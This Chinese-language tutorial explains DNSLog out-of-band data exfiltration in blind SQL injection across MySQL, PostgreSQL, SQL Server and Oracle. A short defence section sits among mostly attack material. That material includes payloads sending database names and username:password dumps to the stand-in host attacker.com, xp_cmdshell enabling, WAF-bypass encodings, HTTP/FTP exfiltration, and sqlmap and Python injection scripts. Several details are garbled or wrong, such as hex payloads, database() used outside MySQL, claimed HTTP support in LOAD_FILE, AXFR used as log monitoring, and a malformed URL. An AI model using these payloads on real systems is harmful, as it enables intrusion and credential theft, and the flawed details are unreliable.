# DNSLog外带原理及在SQL盲注中的使用详解

## 目录
* [1. DNSLog基础原理](#1*dnslog基础原理)
* [2. DNSLog外带工作机制](#2*dnslog外带工作机制)
* [3. SQL盲注中的DNSLog外带技术](#3*sql盲注中的dnslog外带技术)
* [4. 实际攻击场景分析](#4*实际攻击场景分析)
* [5. 防御措施](#5*防御措施)
* [6. 高级技巧与绕过](#6*高级技巧与绕过)
* [7. 工具推荐](#7*工具推荐)

***

## 1. DNSLog基础原理

### 1.1 什么是DNSLog

DNSLog是一种利用DNS查询记录来外带信息的技术。当目标服务器执行了包含域名的SQL语句时，会向DNS服务器发送查询请求，这些查询记录会被记录在DNS日志中，攻击者可以通过监控DNS日志来获取查询内容，从而间接获取数据库中的敏感信息。

### 1.2 DNS查询过程

```
客户端 → DNS服务器：查询example.com的IP地址
DNS服务器 → 客户端：返回example.com对应的IP地址
```

### 1.3 DNSLog的特点

* **隐蔽性**：利用正常的DNS查询机制，不易被WAF等安全设备检测
* **无文件**：不需要在目标服务器上写入文件，避免了写入权限限制
* **低权限**：只需要执行SQL语句的权限即可
* **实时性**：DNS查询几乎是即时的，能够快速获取结果

***

## 2. DNSLog外带工作机制

### 2.1 基本工作流程

```
1. 攻击者构造特殊的DNS域名（如：attacker.com）
2. 将敏感信息编码后拼接到域名中
3. 通过SQL注入执行查询语句
4. 数据库查询触发DNS请求
5. DNS服务器记录查询日志
6. 攻击者通过DNS查询日志获取信息
```

### 2.2 DNS请求的触发条件

在MySQL中，触发DNS查询的函数包括：

* `LOAD_FILE()`
* `OUTFILE` 和 `DUMPFILE`（需要特定配置）
* `SELECT ... INTO OUTFILE`（需要特定配置）
* 自定义函数（如UDF）

### 2.3 数据编码方式

由于DNS域名只能包含特定的字符（a*z, 0*9, .*），需要将数据进行编码：

1. **Base64编码**
   * 适用于所有字符
   * 编码后可能包含/、+、=等字符，需要进一步处理

2. **Hex编码**
   * 将每个字节转换为两位十六进制
   * 然后将十六进制数字转换为字母

3. **自定义编码**
   * 字母转换：a=1, b=2, ..., z=26
   * 数字保持不变
   * 其他字符需要特殊处理

***

## 3. SQL盲注中的DNSLog外带技术

### 3.1 基本盲注原理

DNSLog主要用于带外（Out*of*Band）数据提取，特别适用于以下场景：

1. **无法显示结果的盲注**（如基于时间盲注）
2. **需要获取大量数据时**（比时间盲注更高效）
3. **绕过WAF过滤**（DNS请求相对隐蔽）

### 3.2 MySQL中的DNSLog注入

#### 3.2.1 使用LOAD_FILE函数

```sql
** 基本语法
SELECT LOAD_FILE('\\\\' || (SELECT database()) || '.attacker.com\\test.txt');

** 获取当前数据库
SELECT LOAD_FILE(concat('\\\\', (SELECT database()), '.attacker.com\\a'));

** 获取版本信息
SELECT LOAD_FILE(concat('\\\\', (SELECT version()), '.attacker.com\\a'));

** 获取用户名
SELECT LOAD_FILE(concat('\\\\', (SELECT user()), '.attacker.com\\a'));
```

#### 3.2.2 利用DNS子域名传输数据

```sql
** 获取数据库表名
SELECT LOAD_FILE(concat('\\\\', (select group_concat(table_name) from information_schema.tables where table_schema=database()), '.attacker.com\\a'));

** 获取列名
SELECT LOAD_FILE(concat('\\\\', (select group_concat(column_name) from information_schema.columns where table_name='users'), '.attacker.com\\a'));

** 获取数据
SELECT LOAD_FILE(concat('\\\\', (select group_concat(username,':',password) from users), '.attacker.com\\a'));
```

### 3.3 其他数据库中的DNSLog注入

#### 3.3.1 PostgreSQL

PostgreSQL没有直接的LOAD_FILE函数，但可以通过其他方式触发DNS请求：

```sql
** 利用copy命令（需要特定权限）
COPY (SELECT database()) TO PROGRAM 'nslookup $(database()).attacker.com';

** 利用dblink扩展
SELECT dblink_connect('host='||(SELECT database())||'.attacker.com');
```

#### 3.3.2 SQL Server

SQL Server可以利用xp_cmdshell执行命令：

```sql
** 启用xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

** 执行DNS查询
EXEC xp_cmdshell 'nslookup '+@@version+'.attacker.com';
```

#### 3.3.3 Oracle

Oracle可以通过UTL_INADDR包触发DNS请求：

```sql
** 获取数据库名
SELECT UTL_INADDR.get_host_name((SELECT database_name FROM v$database)||'.attacker.com') FROM dual;

** 获取用户名
SELECT UTL_INADDR.get_host_name((SELECT user FROM dual)||'.attacker.com') FROM dual;
```

***

## 4. 实际攻击场景分析

### 4.1 场景一：获取当前数据库

**目标**：获取当前数据库名称

**攻击流程**：
```bash
# 1. 构造注入语句
payload="SELECT LOAD_FILE(concat('\\\\',(SELECT database()),'.attacker.com\\a'))"

# 2. 发送请求
curl "http://target.com/page.php?id=${payload}"

# 3. 监控DNS查询
dig @8.8.8.8 example.com AXFR
```

**DNS日志示例**：
```
2026*04*24 10:30:00 query: id 12345 example.com IN A
2026*04*24 10:30:00 query: id 12346 testdb.example.com IN A
```

### 4.2 场景二：枚举表名

**目标**：获取数据库中的所有表名

**攻击流程**：
```sql
** 分段获取表名（避免DNS查询长度限制）
SELECT LOAD_FILE(
    concat(
        '\\\\',
        (select substring(group_concat(table_name),1,30) from information_schema.tables where table_schema=database()),
        '.attacker.com\\a'
    )
);
```

### 4.3 场景三：获取敏感数据

**目标**：获取用户表中的用户名和密码

**攻击流程**：
```sql
** 获取用户名
SELECT LOAD_FILE(concat('\\\\', (select group_concat(username) from users), '.attacker.com\\a'));

** 获取密码
SELECT LOAD_FILE(concat('\\\\', (select group_concat(password) from users), '.attacker.com\\a'));

** 组合获取
SELECT LOAD_FILE(concat('\\\\', (select group_concat(username,':',password) from users), '.attacker.com\\a'));
```

### 4.4 场景四：绕过过滤

当直接使用LOAD_FILE被过滤时，可以使用以下方法：

```sql
** 使用十六进制编码
SELECT LOAD_FILE(0x5c5c5c5c7c2853454c4543542064617461626173652829292e61747461636b65722e636f6d5c61);

** 使用concat函数分割
SELECT LOAD_FILE(concat('\\',(SUBSTRING((SELECT database()),1,10)),'.attacker.com\\a'));
```

***

## 5. 防御措施

### 5.1 数据库层面防护

1. **限制LOAD_FILE权限**
   ```sql
   ** MySQL中撤销LOAD_FILE权限
   REVOKE SELECT ON mysql.func FROM 'user'@'host';
   
   ** 限制文件访问目录
   set global secure_file_priv = '/path/to/allowed/directory';
   ```

2. **禁用危险函数**
   ```sql
   ** PostgreSQL禁除危险扩展
   DROP EXTENSION dblink;
   
   ** SQL Server禁用xp_cmdshell
   EXEC sp_configure 'xp_cmdshell', 0;
   RECONFIGURE;
   ```

3. **最小权限原则**
   * 应用数据库使用低权限账号
   * 限制对information_schema表的访问

### 5.2 WAF/IPS防护

1. **特征检测规则**
   * 检测`LOAD_FILE`、`\\\\`、concat函数等特征
   * 监控DNS请求模式

2. **请求长度限制**
   * 限制HTTP请求长度
   * 限制单个参数的长度

3. **白名单机制**
   * 只允许特定的域名解析
   * 使用内部DNS服务器

### 5.3 网络层面防护

1. **DNS防护**
   * 部署DNS防火墙
   * 监控异常DNS查询
   * 限制外部DNS查询

2. **网络隔离**
   * 数据库服务器不允许对外部DNS查询
   * 使用代理服务器统一处理DNS请求

### 5.4 日志监控

1. **数据库审计日志**
   ```sql
   ** MySQL启用审计日志
   SET GLOBAL audit_log_format = 'JSON';
   SET GLOBAL audit_log_policy = 'ALL';
   ```

2. **应用访问日志**
   * 记录所有SQL查询
   * 监控异常的DNS请求

3. **DNS查询日志**
   * 记录所有DNS查询
   * 分析查询模式

***

## 6. 高级技巧与绕过

### 6.1 绕过WAF检测

#### 6.1.1 字符编码绕过

```sql
** URL编码
SELECT LOAD_FILE(%5C%5C%5C%5C(SELECT(database()))%2Eattacker%2Ecom%5Ca)

** Unicode编码
SELECT LOAD_FILE(\\\\(SELECT(database())).attacker.com\a)

** 十六进制编码
SELECT LOAD_FILE(0x5C5C5C5C2853454C4543542064617461626173652829292E61747461636B65722E636F6D5C61)
```

#### 6.1.2 函数混淆

```sql
** 使用变量
@a=(SELECT database());
SELECT LOAD_FILE(concat('\\\\', @a, '.attacker.com\\a'));

** 使用case语句
SELECT LOAD_FILE(concat('\\\\', (case when 1=1 then database() else 'a' end), '.attacker.com\\a'));

** 使用子查询
SELECT LOAD_FILE(concat('\\\\', (select database() from information_schema.tables limit 1), '.attacker.com\\a'));
```

### 6.2 数据分割传输

对于大量数据，可以分段传输：

```sql
** 获取表名并分段
SELECT LOAD_FILE(
    concat(
        '\\\\',
        (select substring(group_concat(table_name),1,30) from information_schema.tables where table_schema=database()),
        '.attacker.com\\a'
    )
);
SELECT LOAD_FILE(
    concat(
        '\\\\',
        (select substring(group_concat(table_name),31,30) from information_schema.tables where table_schema=database()),
        '.attacker.com\\a'
    )
);
```

### 6.3 使用其他协议

除了DNS，还可以使用其他协议外带数据：

#### 6.3.1 HTTP协议

```sql
** MySQL 5.6+支持
SELECT LOAD_FILE('http://attacker.com/' + (SELECT database()));
```

#### 6.3.2 FTP协议

```sql
** 触发FTP请求
SELECT INTO OUTFILE 'ftp://user:pass@attacker.com/' + (SELECT database()) + '.txt';
```

### 6.4 时间盲注配合DNSLog

```sql
** 使用sleep函数结合DNS
SELECT LOAD_FILE(concat('\\\\', 
    (if((select database() like '%test%'), '1', '0')), 
    '.attacker.com\\a')) 
WHERE sleep(1);
```

***

## 7. 工具推荐

### 7.1 DNSLog平台

1. **国内DNSLog平台**
   * http://ceye.io/
   * http://dnslog.cn/
   * http://requestbin.net/

2. **自建DNSLog平台**
   * DnsLog: https://github.com/bishopfox/dnslog
   * DnslogServer: https://github.com/log AnyObject/DnslogServer

### 7.2 SQL注入工具

1. **SQLMap**
   ```bash
   # 使用DNSLog外带
   sqlmap *u "http://target.com/page.php?id=1" **dns*domain=attacker.com
   ```

2. **Burp Suite**
   * 使用Intruder模块
   * 配置DNSLog监听

3. **GoBuster**
   ```bash
   # DNS爆破
   gobuster dns *d example.com *w wordlist.txt
   ```

### 7.3 监控工具

1. **Dig命令**
   ```bash
   # 监控DNS查询
   dig @8.8.8.8 example.com AXFR
   ```

2. **Nmap脚本**
   ```bash
   # 使用NSE脚本
   nmap **script dns*brute example.com
   ```

3. **Wireshark**
   * 捕获DNS流量
   * 分析DNS查询

### 7.4 Python脚本示例

```python
#!/usr/bin/env python3
import requests
import time
import dns.resolver

# DNSLog平台配置
DNSLOG_DOMAIN = "ceye.io"
RESULT_DOMAIN = "dns.ceye.io"

# 发送注入请求
def inject_sql(payload):
    url = f"http://target.com/page.php?id={payload}"
    response = requests.get(url)
    return response.status_code

# 检查DNSLog
def check_dnslog():
    try:
        answers = dns.resolver.resolve(RESULT_DOMAIN, 'A')
        for rdata in answers:
            print(f"[+] DNSLog Result: {rdata}")
    except:
        print("[*] No DNSLog result yet")

# 主函数
def main():
    # 获取数据库名
    payload = "SELECT LOAD_FILE(concat('\\\\',(SELECT database()),'.attacker.com\\a'))"
    inject_sql(payload)
    
    # 等待DNS查询
    time.sleep(5)
    check_dnslog()

if __name__ == "__main__":
    main()
```

***

## 总结

DNSLog外带技术是一种隐蔽的数据提取方式，特别适用于SQL盲注场景。其核心原理是利用DNS查询机制将数据外带到攻击者控制的DNS服务器上。虽然这种技术可以绕过一些安全检测，但通过合理的权限控制、WAF规则配置和日志监控可以有效防御。在实际应用中，应该遵循最小权限原则，及时修补安全漏洞，并加强对异常行为的监控。